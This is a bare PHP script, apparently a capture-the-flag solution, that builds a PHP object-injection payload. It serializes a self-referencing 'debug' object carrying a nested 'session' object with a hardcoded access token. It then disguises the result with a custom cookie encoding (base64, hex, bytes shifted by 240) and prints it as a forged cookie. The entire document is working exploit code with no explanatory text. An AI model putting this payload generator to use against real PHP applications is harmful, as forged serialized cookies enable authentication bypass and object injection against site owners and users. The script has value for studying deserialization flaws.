<?php
class debug {
    public $choose = "2aaaa";
    public $id = 2;
    public $username = "debuger";
    public $forbidden = NULL;
    public $access_token = "";
    public $ob = NULL;
    public $funny = NULL;
}

class session {
    public $access_token = '3ecReK&key';
}
/*
function cookie_decode($str) {
    $data = urldecode($str);
    $data = substr($data, 1);
    $arr = explode('&', $data);
    $cipher = '';
    foreach($arr as $value) {
        $num = hexdec($value);
        $num = $num - 240;
        $cipher = $cipher.'%'.dechex($num);
    }
    $key = urldecode($cipher);
    $key = base64_decode($key);
    return $key;
}
*/

function cookie_encode($str) {
    $key = base64_encode($str);
    $key = bin2hex($key);
    $arr = str_split($key, 2);
    $cipher = '';
    foreach($arr as $value) {
        $num = hexdec($value);
        $num = $num + 240;
        $cipher = $cipher.'&'.dechex($num);
    }
    return $cipher;
}

$obj = new debug();
$obj1 = new session();
$str1 = serialize($obj1);

$obj->forbidden = $obj;
$obj->ob = $obj;
$obj->funny = $str1; // 序列化后的session
$str = serialize($obj);

echo cookie_encode($str);
?>
